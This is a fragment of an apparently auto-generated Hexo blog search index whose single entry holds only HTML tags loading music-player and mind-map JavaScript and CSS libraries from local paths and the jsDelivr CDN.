        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
    </entry>
    
    
  
</search>
